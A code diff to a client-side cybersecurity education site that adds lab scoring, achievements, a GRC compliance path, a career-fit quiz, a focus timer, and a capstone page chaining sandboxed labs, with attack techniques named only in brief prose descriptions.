@@ -209,7 +209,11 @@ function defaultState(){
     daily:{}, // { "YYYY-MM-DD": { qi, chosen, correct } }
     leaderboardOptIn:false,
     leaderboardName:'',
-    certTracker:{} // { certId: 'not-started'|'studying'|'scheduled'|'passed' }
+    certTracker:{}, // { certId: 'not-started'|'studying'|'scheduled'|'passed' }
+    labsCompleted:{}, // { labId: timestamp }
+    weeklyChain:{}, // { chainId: {answers:[{chosen,correct}]} }
+    pomodoroSessions:{}, // { "YYYY-MM-DD": count }
+    highContrast:false
   };
 }
 function loadState(){
@@ -236,6 +240,18 @@ function toggleComplete(pathId,subId){
   return nowComplete;
 }
 function isBookmarked(pathId,subId){ return !!STATE.bookmarks[lessonKey(pathId,subId)]; }
+function markLabComplete(labId){
+  if(STATE.labsCompleted[labId]) return;
+  STATE.labsCompleted[labId] = Date.now();
+  saveState();
+  checkAchievements();
+}
+function labScoreboard(){
+  const done = (typeof LABS!=='undefined'?LABS:[]).filter(l=>STATE.labsCompleted[l.id]);
+  const points = done.reduce((s,l)=>s+(l.points||10),0);
+  const totalPoints = (typeof LABS!=='undefined'?LABS:[]).reduce((s,l)=>s+(l.points||10),0);
+  return {done:done.length, total:(typeof LABS!=='undefined'?LABS.length:0), points, totalPoints};
+}
 function toggleBookmark(pathId,subId){
   const k = lessonKey(pathId,subId);
   const nowSaved = !STATE.bookmarks[k];
@@ -371,6 +387,7 @@ function resolveTheme(){
 function applyTheme(){
   const theme = resolveTheme();
   document.documentElement.setAttribute('data-theme', theme);
+  document.documentElement.classList.toggle('hc', !!STATE.highContrast);
   document.getElementById('themeToggle')?.setAttribute('aria-pressed', theme === 'light' ? 'true' : 'false');
   const meta = document.querySelector('meta[name="theme-color"]');
   if(meta) meta.setAttribute('content', theme === 'light' ? '#F6F7FA' : '#0A0E13');
@@ -472,8 +489,29 @@ const ACHIEVEMENTS = [
   {id:'theme-explorer', ico:'🌓', t:'Night & Day', d:'Try both the light and dark themes.',
    check:()=>!!(STATE.achievements['theme-explorer-seen-dark'] && STATE.achievements['theme-explorer-seen-light'])},
   {id:'searcher', ico:'🔍', t:'Explorer', d:'Use search to jump straight to a lesson.',
-   check:()=>!!STATE.usedSearch}
+   check:()=>!!STATE.usedSearch},
+  {id:'lab-rat', ico:'🧪', t:'Lab Rat', d:'Solve 3 interactive labs.',
+   check:()=>Object.keys(STATE.labsCompleted).length >= 3},
+  {id:'red-team-ready', ico:'💀', t:'Red Team Ready', d:'Solve every interactive lab.',
+   check:()=>typeof LABS!=='undefined' && LABS.length>0 && LABS.every(l=>STATE.labsCompleted[l.id])},
+  {id:'capstone-complete', ico:'⛓️', t:'Chain Breaker', d:'Complete the capstone attack-chain challenge.',
+   check:()=>['osint','idor','jwt','terminal'].every(id=>STATE.labsCompleted[id])},
+  {id:'weekly-chain', ico:'📆', t:'Chain Learner', d:'Finish a weekly challenge chain.',
+   check:()=>Object.keys(STATE.achievements).some(k=>k.startsWith('_weekly_'))},
+  {id:'focused', ico:'🍅', t:'Locked In', d:'Complete a 25-minute focus timer session.',
+   check:()=>Object.values(STATE.pomodoroSessions||{}).some(n=>n>=1)}
 ];
+/* Difficulty tier for display only — a designed classification (not a
+   live population statistic, which this site has no way to compute
+   without a server tracking every user's achievements). */
+const ACHIEVEMENT_TIERS = {
+  'first-lesson':'Common', 'quiz-pass':'Common', 'bookworm':'Common', 'note-taker':'Common',
+  'theme-explorer':'Common', 'searcher':'Common', 'streak':'Common', 'focused':'Common',
+  'ten-lessons':'Uncommon', 'fifty-percent':'Uncommon', 'first-path':'Uncommon',
+  'quiz-master':'Uncommon', 'lab-rat':'Uncommon', 'weekly-chain':'Uncommon',
+  'final-quiz':'Rare', 'certificate':'Rare', 'red-team-ready':'Rare', 'capstone-complete':'Rare',
+  'all-complete':'Legendary'
+};
 let pendingToasts = [];
 function checkAchievements(){
   let newlyUnlocked = [];
@@ -839,6 +877,19 @@ const PATHS = [
      {n:"6", id:"metrics-that-matter",      title:"Metrics That Matter", desc:"Coverage, backlog health, and the numbers that actually earn budget."},
      {n:"7", id:"building-appsec-program",  title:"Building an AppSec Program from Scratch", desc:"The maturity ladder from ad hoc to optimising, and a concrete first 90 days."},
      {n:"8", id:"appsec-program-lab",       title:"AppSec Program Capstone Lab", desc:"Design a lightweight AppSec program for a real-shaped organisation."}
+   ]},
+  {n:"23", id:"23-grc-compliance", title:"GRC & Compliance", level:"All levels",
+   desc:"Governance, Risk, and Compliance — the non-coding path into security. ISO 27001, NIST CSF, SOC 2, vendor risk, and how to actually break into a GRC career.",
+   subs:[
+     {n:"1", id:"what-is-grc",                title:"What is GRC?", desc:"Governance, Risk, and Compliance — and why it's a real, growing entry point into security."},
+     {n:"2", id:"governance-basics",          title:"Security Governance Basics", desc:"Who decides, and how — policy, standard, procedure, and who's in the room."},
+     {n:"3", id:"risk-management-fundamentals", title:"Risk Management Fundamentals", desc:"Risk registers, treatment options, and inherent vs. residual risk."},
+     {n:"4", id:"iso27001-overview",          title:"ISO 27001 Overview", desc:"The world's most recognised ISMS standard — Annex A, the SoA, and the audit process."},
+     {n:"5", id:"nist-csf-overview",          title:"NIST Cybersecurity Framework Overview", desc:"Govern, Identify, Protect, Detect, Respond, Recover — the six functions and maturity tiers."},
+     {n:"6", id:"soc2-and-audits",            title:"SOC 2 and Audits", desc:"Type I vs Type II, Trust Services Criteria, and what an auditor actually checks."},
+     {n:"7", id:"policies-and-procedures",    title:"Writing Policies People Actually Follow", desc:"The anatomy of a policy that survives contact with a real engineering team."},
+     {n:"8", id:"third-party-vendor-risk",    title:"Third-Party & Vendor Risk", desc:"Why vendors are the weak link, and how to actually assess them."},
+     {n:"9", id:"grc-tools-and-careers",      title:"GRC Tools, Certifications & Careers", desc:"Vanta/Drata, CISA/CRISC/CISM, and how to break into a GRC role."}
    ]}
 
 ];
@@ -937,6 +988,15 @@ const TRACKS = [
       {pathId:'18-ai-security'},
       {pathId:'20-career-prep'}
     ]
+  },
+  {
+    id:'grc-analyst', ico:'📋', title:'GRC Analyst Track', desc:'Governance, risk, and compliance — the non-coding path into security.',
+    steps:[
+      {pathId:'01-introduction'},
+      {pathId:'10-fundamentals'},
+      {pathId:'23-grc-compliance'},
+      {pathId:'20-career-prep'}
+    ]
   }
 ];
 
@@ -966,7 +1026,7 @@ const CAREERS = [
   {role:"Cloud Security Engineer", desc:"Secure AWS, Azure, and Google Cloud.",            follow:"10 → 16"},
   {role:"Digital Forensics / IR",  desc:"Investigate incidents and evict attackers.",      follow:"03 → 12 → 16"},
   {role:"AI Red Teamer",           desc:"Adversarially test AI systems for safety.",       follow:"05 → 11 → 18"},
-  {role:"Security / GRC Analyst",  desc:"Manage risk, policy, and compliance.",             follow:"01 → 10"}
+  {role:"Security / GRC Analyst",  desc:"Manage risk, policy, and compliance.",             follow:"01 → 10 → 23"}
 ];
 
 const FAQS = [
@@ -1031,6 +1091,7 @@ function route(){
   currentTocObserver?.disconnect();
   document.getElementById('tocFloat')?.remove();
   clearInterval(mockInterviewTimer);
+  clearInterval(pomodoroInterval);
   // Magic-link / OAuth redirects land back on the site with auth tokens
   // riding in the URL (e.g. #access_token=...). That's not a real route —
   // show a brief loading state and let the auth bootstrap below redirect
@@ -1066,6 +1127,14 @@ function route(){
   else if(hash === '#/quiz/final') renderQuiz('final');
   else if(hash === '#/labs/idor') renderLabIdor();
   else if(hash === '#/labs/jwt') renderLabJwt();
+  else if(hash === '#/labs/traversal') renderLabTraversal();
+  else if(hash === '#/labs/ssrf') renderLabSsrf();
+  else if(hash === '#/labs/xxe') renderLabXxe();
+  else if(hash === '#/labs/loganalysis') renderLabLogAnalysis();
+  else if(hash === '#/labs/osint') renderLabOsint();
+  else if(hash === '#/capstone') renderCapstone();
+  else if(hash === '#/weekly') renderWeeklyIndex();
+  else if(hash === '#/career-quiz') renderCareerQuiz();
   else if(hash === '#/interview/mock') renderMockInterview();
   else if(hash === '#/certs') renderCertTracker();
   else if(hash === '#/skilltree') renderSkillTree();
@@ -1075,11 +1144,13 @@ function route(){
     const partsPath = hash.match(/^#\/lesson\/([^/]+)$/);
     const partsTrack = hash.match(/^#\/track\/([^/]+)$/);
     const partsProfile = hash.match(/^#\/u\/([^/]+)$/);
+    const partsWeekly = hash.match(/^#\/weekly\/([^/]+)$/);
     if(partsQuiz) renderQuiz(partsQuiz[1]);
     else if(partsSub) renderSubLesson(partsSub[1], partsSub[2]);
     else if(partsPath) renderPathOverview(partsPath[1]);
     else if(partsTrack) renderTrack(partsTrack[1]);
     else if(partsProfile) renderPublicProfile(partsProfile[1]);
+    else if(partsWeekly) renderWeeklyChain(partsWeekly[1]);
     else renderNotFound();
   }
   afterRender();
@@ -1249,10 +1320,31 @@ function dailyLesson(){
   return flat[h % flat.length];
 }
 
+/* "What to learn next" — surfaces either the weakest quiz-scored path
+   (lowest pass %) or, failing that, an unfinished bookmark. Returns
+   null if there's not enough signal yet (new/light users). */
+function whatToLearnNext(){
+  const scored = Object.entries(STATE.quizScores || {})
+    .map(([pathId, s]) => ({pathId, pct: s.pct}))
+    .filter(s => s.pct < 100)
+    .sort((a,b) => a.pct - b.pct);
+  if(scored.length){
+    const p = findPath(scored[0].pathId);
+    if(p) return {kind:'weak-quiz', path:p, pct:scored[0].pct};
+  }
+  const bookmarkEntry = Object.keys(STATE.bookmarks)
+    .sort((a,b)=>STATE.bookmarks[b]-STATE.bookmarks[a])
+    .map(k=>{ const [pathId,subId]=k.split('/'); return findSubContext(pathId,subId); })
+    .find(ctx => ctx && !isComplete(ctx.path.id, ctx.sub.id));
+  if(bookmarkEntry) return {kind:'bookmark', ctx:bookmarkEntry};
+  return null;
+}
+
 function renderHome(){
   const total = totalSubLessons();
   const continueCtx = STATE.lastVisited ? findSubContext(STATE.lastVisited.pathId, STATE.lastVisited.subId) : null;
   const daily = dailyLesson();
+  const next = whatToLearnNext();
   app.innerHTML = `
     <section class="hero">
       <div class="hero-inner">
@@ -1276,6 +1368,13 @@ function renderHome(){
           <a class="daily-link" href="#/lesson/${daily.pathId}/${daily.subId}">${daily.pathN}.${daily.subN} · ${daily.subTitle}</a>
           <span class="daily-src">Path ${daily.pathN} — ${daily.pathTitle}</span>
         </div>
+        ${next ? `
+        <div class="daily-lesson" data-reveal style="--i:3">
+          <span class="daily-tag">🎯 What to learn next</span>
+          ${next.kind==='weak-quiz'
+            ? `<a class="daily-link" href="#/quiz/${next.path.id}">Retake the ${next.path.title} quiz</a><span class="daily-src">You scored ${next.pct}% last time — worth another pass</span>`
+            : `<a class="daily-link" href="#/lesson/${next.ctx.path.id}/${next.ctx.sub.id}">${next.ctx.path.n}.${next.ctx.sub.n} · ${next.ctx.sub.title}</a><span class="daily-src">Bookmarked, not finished yet</span>`}
+        </div>` : ''}
         <div class="hero-stats" data-reveal style="--i:4">
           <div><div class="hstat-n" data-count="${PATHS.length}">${PATHS.length}</div><div class="hstat-l">learning paths</div></div>
           <div><div class="hstat-n" data-count="${total}" data-suffix="+">${total}+</div><div class="hstat-l">sub-lessons</div></div>
@@ -1583,6 +1682,103 @@ function renderCertTracker(){
   setupReveal();
 }
 
+/* ============================================================
+   Career-fit quiz — a short questionnaire recommending which career
+   archetype (and which track/path) fits someone's interests, instead
+   of making a new visitor guess where to start.
+   ============================================================ */
+const CAREER_QUIZ_QUESTIONS = [
+  {q:'When something breaks, what do you want to do first?', options:[
+    {t:'Figure out exactly how it broke and prove it', tags:{pentester:2,bughunter:1}},
+    {t:'Find out who did it and reconstruct what happened', tags:{soc:2,forensics:1}},
+    {t:'Fix the underlying process so it can\'t happen again', tags:{grc:2,appsec:1}},
+    {t:'Rebuild the system so it stays fixed next time', tags:{cloud:2,appsec:1}}
+  ]},
+  {q:'Which sounds most satisfying?', options:[
+    {t:'Getting a working exploit after hours of trying', tags:{pentester:2,bughunter:2}},
+    {t:'Spotting the one weird log line that reveals an attack', tags:{soc:2,forensics:2}},
+    {t:'Getting a whole team to actually follow a security process', tags:{grc:2}},
+    {t:'Shipping a fix that closes a whole class of bugs at once', tags:{appsec:2,cloud:1}}
+  ]},
+  {q:'How do you feel about writing code?', options:[
+    {t:'Love it — I want to build and automate things', tags:{appsec:2,cloud:1}},
+    {t:'Fine with it, mostly scripts and tooling', tags:{pentester:1,bughunter:1,soc:1}},
+    {t:'I\'d rather read/review it than write much of it', tags:{appsec:1,grc:1}},
+    {t:'Not really my thing — I prefer process and people', tags:{grc:2}}
+  ]},
+  {q:'Pick a work rhythm', options:[
+    {t:'Deep focus on one target for days at a time', tags:{pentester:2,bughunter:1}},
+    {t:'Real-time monitoring, react fast when something fires', tags:{soc:2}},
+    {t:'Structured projects with clear deliverables and deadlines', tags:{grc:2,appsec:1}},
+    {t:'Constantly learning a fast-moving new area', tags:{cloud:2,bughunter:1}}
+  ]},
+  {q:'What sounds like a good first year on the job?', options:[
+    {t:'Getting my first CVE or bug bounty payout', tags:{bughunter:2,pentester:1}},
+    {t:'Leading incident response on a real (contained) incident', tags:{soc:2,forensics:1}},
+    {t:'Getting the company through its first SOC 2 audit', tags:{grc:2}},
+    {t:'Migrating a legacy app to run securely in the cloud', tags:{cloud:2,appsec:1}}
+  ]}
+];
+const CAREER_QUIZ_RESULTS = {
+  pentester:{role:'Penetration Tester', trackId:'pentester', desc:'You like proving a weakness is real, not just theoretical. Structured, hands-on offensive work.'},
+  bughunter:{role:'Bug Bounty Hunter', trackId:'bug-hunter', desc:'You like the hunt — independent, web/logic-focused, and directly rewarded for what you find.'},
+  soc:{role:'SOC Analyst', trackId:'soc-analyst', desc:'You like real-time defense — watching, detecting, and reacting fast when something\'s wrong.'},
+  forensics:{role:'Digital Forensics / IR', trackId:'soc-analyst', desc:'You like reconstructing exactly what happened after the fact, methodically and precisely.'},
+  grc:{role:'Security / GRC Analyst', trackId:'grc-analyst', desc:'You like structure, process, and getting organisations to actually do the right thing — no coding required.'},
+  appsec:{role:'AppSec Engineer', trackId:'appsec', desc:'You like fixing root causes at scale, working closely with developers to build security in.'},
+  cloud:{role:'Cloud Security Engineer', trackId:'cloud-sec', desc:'You like fast-moving infrastructure work — AWS/Azure/GCP, containers, and modern architecture.'}
+};
+function renderCareerQuiz(){
+  if(!STATE._careerQuizAnswers) STATE._careerQuizAnswers = [];
+  const qi = STATE._careerQuizAnswers.length;
+  if(qi >= CAREER_QUIZ_QUESTIONS.length){
+    const totals = {};
+    STATE._careerQuizAnswers.forEach(ans=>{ Object.entries(ans.tags||{}).forEach(([k,v])=>{ totals[k]=(totals[k]||0)+v; }); });
+    const topKey = Object.entries(totals).sort((a,b)=>b[1]-a[1])[0]?.[0] || 'appsec';
+    const result = CAREER_QUIZ_RESULTS[topKey];
+    app.innerHTML = `
+      <section class="sec">
+        <div class="sec-head" data-reveal>
+          <div class="sec-eyebrow">Career-fit quiz</div>
+          <h2>Your best fit: ${escapeHtml(result.role)}</h2>
+          <p class="sec-lead">${escapeHtml(result.desc)}</p>
+          <div class="hero-btns" style="justify-content:flex-start;margin-top:1rem">
+            <a class="btn-amber" href="#/track/${result.trackId}">See the ${escapeHtml(result.role)} track →</a>
+            <a class="btn-ghost" href="#/careers">Compare all careers</a>
+            <button class="btn-ghost" id="cqRetake" type="button">Retake quiz</button>
+          </div>
+        </div>
+      </section>
+    `;
+    setupReveal();
+    document.getElementById('cqRetake').addEventListener('click', ()=>{ STATE._careerQuizAnswers = []; renderCareerQuiz(); });
+    return;
+  }
+  const item = CAREER_QUIZ_QUESTIONS[qi];
+  app.innerHTML = `
+    <section class="sec">
+      <div class="quiz-wrap">
+        <div class="quiz-head" data-reveal>
+          <div class="sec-eyebrow">Career-fit quiz · Question ${qi+1} of ${CAREER_QUIZ_QUESTIONS.length}</div>
+          <h2>${escapeHtml(item.q)}</h2>
+        </div>
+        <div class="quiz-card" data-reveal style="--i:1">
+          <div class="quiz-options" id="cqOpts">
+            ${item.options.map((o,oi)=>`<button class="quiz-opt" data-oi="${oi}" type="button"><span class="opt-letter">${String.fromCharCode(65+oi)}</span><span>${escapeHtml(o.t)}</span></button>`).join('')}
+          </div>
+        </div>
+      </div>
+    </section>
+  `;
+  setupReveal();
+  document.querySelectorAll('#cqOpts .quiz-opt').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      STATE._careerQuizAnswers.push(item.options[parseInt(btn.dataset.oi,10)]);
+      renderCareerQuiz();
+    });
+  });
+}
+
 function renderCareers(){
   app.innerHTML = `
     <section class="sec">
@@ -1590,6 +1786,9 @@ function renderCareers(){
         <div class="sec-eyebrow">Careers</div>
         <h2>Where this course leads</h2>
         <p class="sec-lead">Security has many careers. Here's what each does and which paths get you there.</p>
+        <div class="hero-btns" style="justify-content:flex-start;margin-top:1rem">
+          <a class="btn-amber sm" href="#/career-quiz">🧭 Not sure? Take the 2-minute career-fit quiz →</a>
+        </div>
       </div>
       <div class="careers">
         ${CAREERS.map((c,i)=>`
@@ -1695,8 +1894,15 @@ async function renderSubLesson(pathId, subId){
             <button class="icon-btn" id="printLessonBtn" type="button" aria-label="Print or save this lesson as PDF" title="Print / Save as PDF">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
             </button>
+            <button class="icon-btn" id="pomodoroBtn" type="button" aria-label="Start a focus timer" title="Focus timer">🍅</button>
             <button class="btn-ghost sm mobile-only" id="menuBtn" aria-label="Open lesson menu">☰ Lessons</button>
           </div>
+        </div>
+        <div class="pomodoro-widget" id="pomodoroWidget" hidden>
+          <span class="pomodoro-time" id="pomodoroTime">25:00</span>
+          <button class="btn-ghost sm" id="pomodoroToggle" type="button">Start</button>
+          <button class="btn-ghost sm" id="pomodoroReset" type="button">Reset</button>
+          <span class="pomodoro-count" id="pomodoroCount"></span>
         </div>
         <div class="md" id="content"><div class="loading">Loading…</div></div>
         <details class="notes-panel">
@@ -1742,6 +1948,7 @@ async function renderSubLesson(pathId, subId){
     document.getElementById('sidebar').classList.toggle('open');
   });
   document.getElementById('printLessonBtn')?.addEventListener('click',()=>window.print());
+  wirePomodoro();
 
   const reportBtn = document.getElementById('reportMistakeBtn');
   const reportForm = document.getElementById('reportMistakeForm');
@@ -2002,6 +2209,64 @@ function buildTocFloat(tocable){
 }
 let currentTocObserver = null;
 let mockInterviewTimer = null;
+let pomodoroInterval = null;
+
+/* Focus timer (Pomodoro) — 25-minute countdown on lesson pages. Purely
+   client-side; a completed session logs to STATE.pomodoroSessions,
+   which counts toward the day's streak/heatmap same as a lesson visit. */
+function wirePomodoro(){
+  const POMODORO_SECONDS = 25*60;
+  let secondsLeft = POMODORO_SECONDS;
+  let running = false;
+  const widget = document.getElementById('pomodoroWidget');
+  const timeEl = document.getElementById('pomodoroTime');
+  const toggleBtn = document.getElementById('pomodoroToggle');
+  const countEl = document.getElementById('pomodoroCount');
+  if(!widget) return;
+
+  const today = new Date().toISOString().slice(0,10);
+  const fmt = s => `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
+  const paintCount = ()=>{ countEl.textContent = STATE.pomodoroSessions[today] ? `${STATE.pomodoroSessions[today]} session${STATE.pomodoroSessions[today]>1?'s':''} today` : ''; };
+  paintCount();
+
+  document.getElementById('pomodoroBtn').addEventListener('click', ()=>{
+    widget.hidden = !widget.hidden;
+  });
+  document.getElementById('pomodoroReset').addEventListener('click', ()=>{
+    clearInterval(pomodoroInterval);
+    running = false;
+    secondsLeft = POMODORO_SECONDS;
+    timeEl.textContent = fmt(secondsLeft);
+    toggleBtn.textContent = 'Start';
+  });
+  toggleBtn.addEventListener('click', ()=>{
+    if(running){
+      clearInterval(pomodoroInterval);
+      running = false;
+      toggleBtn.textContent = 'Resume';
+      return;
+    }
+    running = true;
+    toggleBtn.textContent = 'Pause';
+    pomodoroInterval = setInterval(()=>{
+      secondsLeft--;
+      timeEl.textContent = fmt(secondsLeft);
+      if(secondsLeft <= 0){
+        clearInterval(pomodoroInterval);
+        running = false;
+        secondsLeft = POMODORO_SECONDS;
+        toggleBtn.textContent = 'Start';
+        STATE.pomodoroSessions[today] = (STATE.pomodoroSessions[today]||0) + 1;
+        STATE.visitDays[today] = true;
+        saveState();
+        checkAchievements();
+        paintCount();
+        fireConfetti({count:60});
+        timeEl.textContent = fmt(POMODORO_SECONDS);
+      }
+    }, 1000);
+  });
+}
 
 /* Copy-to-clipboard buttons + best-effort syntax highlighting on all real
    code blocks (mermaid fences were already converted to .mermaid divs). */
@@ -2510,32 +2775,98 @@ function renderTrack(id){
    evaluation runs client-side; there's no real backend involved.
    ============================================================ */
 const LABS = [
-  {id:'terminal', ico:'🖥', title:'Terminal Simulator', desc:'A safe, in-browser Linux terminal with a fake filesystem. Practice ls, cd, cat, grep, find, whoami and more without spinning up a VM.', related:'Path 03 — Linux'},
-  {id:'webapp', ico:'🕸', title:'Vulnerable Web App', desc:'A tiny deliberately-broken app for practicing XSS and login-bypass. Runs entirely in-browser; no server to attack, nothing to install.', related:'Path 11 — Web Security'},
-  {id:'sqli', ico:'💉', title:'SQL Injection Sandbox', desc:'A fake login backed by a simulated database. Watch your input become SQL, then bypass the login with a classic injection.', related:'Path 11 — Web Security'},
-  {id:'phishing', ico:'🎣', title:'Phishing Spotter', desc:'Real email or phish? Call each one, then see the exact red flags you spotted (or missed). Trains the instinct that stops most attacks.', related:'Path 10 — Fundamentals'},
-  {id:'pcap', ico:'📡', title:'Packet Capture Viewer', desc:'Load a sample capture and explore protocols, IPs, and payloads — the same "read the traffic" muscle Wireshark builds.', related:'Path 12 — Network Security'},
-  {id:'idor', ico:'🔓', title:'IDOR Playground', desc:'A fake "my invoices" page. Change one number in the URL and see whose data you were never supposed to see.', related:'Path 11 — Web Security'},
-  {id:'jwt', ico:'🪪', title:'JWT Forgery Lab', desc:'Tamper with a JSON Web Token — strip the signature, flip a claim, and watch a vulnerable "verify" endpoint accept it anyway.', related:'Path 11 — Web Security'}
+  {id:'terminal', ico:'🖥', title:'Terminal Simulator', desc:'A safe, in-browser Linux terminal with a fake filesystem. Practice ls, cd, cat, grep, find, whoami and more without spinning up a VM.', related:'Path 03 — Linux', points:10},
+  {id:'webapp', ico:'🕸', title:'Vulnerable Web App', desc:'A tiny deliberately-broken app for practicing XSS and login-bypass. Runs entirely in-browser; no server to attack, nothing to install.', related:'Path 11 — Web Security', points:15},
+  {id:'sqli', ico:'💉', title:'SQL Injection Sandbox', desc:'A fake login backed by a simulated database. Watch your input become SQL, then bypass the login with a classic injection.', related:'Path 11 — Web Security', points:15},
+  {id:'phishing', ico:'🎣', title:'Phishing Spotter', desc:'Real email or phish? Call each one, then see the exact red flags you spotted (or missed). Trains the instinct that stops most attacks.', related:'Path 10 — Fundamentals', points:10},
+  {id:'pcap', ico:'📡', title:'Packet Capture Viewer', desc:'Load a sample capture and explore protocols, IPs, and payloads — the same "read the traffic" muscle Wireshark builds.', related:'Path 12 — Network Security', points:10},
+  {id:'idor', ico:'🔓', title:'IDOR Playground', desc:'A fake "my invoices" page. Change one number in the URL and see whose data you were never supposed to see.', related:'Path 11 — Web Security', points:15},
+  {id:'jwt', ico:'🪪', title:'JWT Forgery Lab', desc:'Tamper with a JSON Web Token — strip the signature, flip a claim, and watch a vulnerable "verify" endpoint accept it anyway.', related:'Path 11 — Web Security', points:20},
+  {id:'traversal', ico:'📂', title:'Path Traversal Playground', desc:'A fake "view file" feature that trusts the filename you give it. Climb out of the intended folder with ../ and read files you shouldn\'t.', related:'Path 11 — Web Security', points:15},
+  {id:'ssrf', ico:'🌐', title:'SSRF Playground', desc:'A "fetch this URL for me" feature with no allowlist. Point it at internal-looking addresses and see what it leaks.', related:'Path 11 — Web Security', points:20},
+  {id:'xxe', ico:'📄', title:'XXE Playground', desc:'An XML upload feature that expands external entities. Smuggle a local file read through a "harmless" XML document.', related:'Path 11 — Web Security', points:20},
+  {id:'loganalysis', ico:'📜', title:'Log Analysis / IR Lab', desc:'A messy auth.log dump from a compromised box. Reconstruct the timeline and find the breach — blue-team skills, not exploitation.', related:'Path 12 — Network Security', points:15},
+  {id:'osint', ico:'🔍', title:'OSINT Sandbox', desc:'A safe, fake company profile — practise open-source recon technique without touching anything real.', related:'Path 14 — Ethical Hacking', points:10}
 ];
+/* ============================================================
+   Capstone attack-chain — a narrative wrapper around four existing
+   labs, framed as one breach story with a visible kill-chain
+   progress bar. Doesn't duplicate lab logic — just tracks the same
+   STATE.labsCompleted flags those labs already set.
+   ============================================================ */
+const CAPSTONE_CHAIN = [
+  {stage:'Recon', labId:'osint', ico:'🔍', title:'Scope the target', blurb:'Before touching anything, gather what\'s public. Find the tech stack and an admin\'s identity through the OSINT Sandbox.'},
+  {stage:'Initial Access', labId:'idor', ico:'🔓', title:'Get into an account you shouldn\'t', blurb:'The target\'s "invoices" API trusts IDs blindly. Use the IDOR Playground to view data that isn\'t yours.'},
+  {stage:'Privilege Escalation', labId:'jwt', ico:'🪪', title:'Become admin', blurb:'A guest session token isn\'t enough. Forge an admin JWT in the JWT Forgery Lab.'},
+  {stage:'Post-Exploitation', labId:'terminal', ico:'🖥', title:'Find what they left behind', blurb:'You\'re in. Use the Terminal Simulator to hunt for credentials an admin carelessly stored in a file.'}
+];
+function renderCapstone(){
+  const doneCount = CAPSTONE_CHAIN.filter(c=>STATE.labsCompleted[c.labId]).length;
+  const allDone = doneCount === CAPSTONE_CHAIN.length;
+  app.innerHTML = `
+    <section class="sec">
+      <div class="sec-head" data-reveal>
+        <div class="sec-eyebrow">Capstone challenge</div>
+        <h2>⛓️ The Attack Chain</h2>
+        <p class="sec-lead">Four labs you've already met, chained into one breach story. Work through them in order — recon, get in, escalate, then see what you can find. Same labs, same safety, just told as one narrative.</p>
+        <div class="mini-progress" style="max-width:24rem;margin-top:1.2rem">
+          <div class="mini-progress-track"><div class="mini-progress-fill" style="width:0%" data-pct="${Math.round(doneCount/CAPSTONE_CHAIN.length*100)}"></div></div>
+          <div class="mini-progress-label"><span>${doneCount}/${CAPSTONE_CHAIN.length} stages complete</span></div>
+        </div>
+      </div>
+      <div class="roadmap-wrap" data-reveal style="--i:1">
+        <div class="roadmap-line"></div>
+        ${CAPSTONE_CHAIN.map((c,i)=>{
+          const done = !!STATE.labsCompleted[c.labId];
+          return `
+          <a class="roadmap-node ${done?'done':''}" href="#/labs/${c.labId}">
+            <div class="roadmap-dot">${done ? '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>' : c.ico}</div>
+            <div class="roadmap-card">
+              <div class="roadmap-card-title">Stage ${i+1}: ${c.stage} — ${c.title}</div>
+              <div class="roadmap-card-desc">${c.blurb}</div>
+            </div>
+          </a>
+        `;}).join('')}
+      </div>
+      ${allDone ? `
+        <div class="hub-section" data-reveal style="--i:2;text-align:center">
+          <h3 style="font-family:'Space Grotesk'">🎉 Chain complete — full compromise, start to finish.</h3>
+          <p class="sec-lead">You just walked an entire realistic breach: recon → initial access → privilege escalation → post-exploitation. That's the actual shape of most real-world incidents.</p>
+        </div>
+      ` : ''}
+    </section>
+  `;
+  setupReveal();
+}
+
 function renderLabsIndex(){
   const labs = LABS;
+  const sb = labScoreboard();
   app.innerHTML = `
     <section class="sec">
       <div class="sec-head" data-reveal>
         <div class="sec-eyebrow">Interactive labs</div>
         <h2>Practise inside the browser</h2>
         <p class="sec-lead">Real security work is hands-on. These labs run entirely client-side — nothing to install, no VMs, no risk of hitting anything you shouldn't.</p>
+        <div class="mini-progress" style="max-width:22rem;margin-top:1.2rem">
+          <div class="mini-progress-track"><div class="mini-progress-fill" style="width:0%" data-pct="${sb.totalPoints?Math.round(sb.points/sb.totalPoints*100):0}"></div></div>
+          <div class="mini-progress-label"><span>${sb.done}/${sb.total} labs solved</span><span>${sb.points}/${sb.totalPoints} points</span></div>
+        </div>
+        <div class="hero-btns" style="justify-content:flex-start;margin-top:1rem">
+          <a class="btn-amber sm" href="#/capstone">⛓️ Try the capstone attack chain →</a>
+        </div>
       </div>
       <div class="labs-grid" data-reveal style="--i:1">
-        ${labs.map(l=>`
-          <a class="lab-card" href="#/labs/${l.id}">
+        ${labs.map(l=>{
+          const done = !!STATE.labsCompleted[l.id];
+          return `
+          <a class="lab-card ${done?'is-complete':''}" href="#/labs/${l.id}">
             <div class="lab-ico">${l.ico}</div>
-            <h3>${l.title}</h3>
+            <h3>${l.title} ${done?'<span class="lab-done-badge" title="Solved">✅</span>':''}</h3>
             <p>${escapeHtml(l.desc)}</p>
-            <div class="lab-related">Pairs with: <b>${l.related}</b></div>
+            <div class="lab-related">Pairs with: <b>${l.related}</b> · ${l.points||10} pts</div>
           </a>
-        `).join('')}
+        `;}).join('')}
       </div>
     </section>
   `;
@@ -2697,6 +3028,7 @@ function renderLabTerminal(){
     if(output) print(output.endsWith('\n') ? output : output + '\n');
     print(prompt());
     document.getElementById('termPrefix').innerHTML = prompt();
+    if(/passwords\.txt/.test(line)) markLabComplete('terminal');
     input.value = '';
   });
   input.addEventListener('keydown', e=>{
@@ -2752,7 +3084,7 @@ function renderLabWebapp(){
   const xssForm = document.getElementById('xssForm');
   const xssFrame = document.getElementById('xssFrame');
   const xssHit = document.getElementById('xssHit');
-  window.__xssTriggered = ()=>{ xssHit.hidden = false; };
+  window.__xssTriggered = ()=>{ xssHit.hidden = false; markLabComplete('webapp'); };
   xssForm.addEventListener('submit', e=>{
     e.preventDefault();
     const q = document.getElementById('xssQuery').value;
